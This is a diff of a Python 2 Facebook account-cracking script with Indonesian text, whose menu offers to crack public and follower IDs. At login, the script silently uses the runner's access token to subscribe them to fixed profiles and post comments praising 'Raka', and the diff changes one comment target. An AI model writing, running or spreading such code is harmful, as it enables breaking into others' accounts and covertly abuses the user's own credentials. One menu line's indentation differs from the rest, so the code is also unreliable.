@@ -102,7 +102,7 @@ def login():
 			requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
 			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
 			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
-			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)
+			requests.post("https://graph.facebook.com/4257706904267068/comments?message=Good Job 😊 !&access_token="+token)
 			requests.post("https://graph.facebook.com/4257706904267068/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
 			menu()
 		except KeyError:
@@ -137,10 +137,10 @@ def menu():
 	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m1\033[1;96m]\033[1;97m Crack Id Public")
 	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m2\033[1;96m]\033[1;97m Crack Id Followers")
 	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m3\033[1;96m]\033[1;97m Check Crack Results")
-	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m4\033[1;96m]\033[1;97m User-Agent Settings")
+	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m4\033[1;96m]\033[1;97m User Agent Setting")
         print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m5\033[1;96m]\033[1;97m Report A Bug")
 	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m6\033[1;96m]\033[1;91m Remove Token")
-	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m0\033[1;96m]\033[1;97m Exit\n")		
+	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m0\033[1;96m]\033[1;97m Keluar\n")		
 	Raka = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Option     : \033[1;92m")
 	if Raka =="":
 		menu()
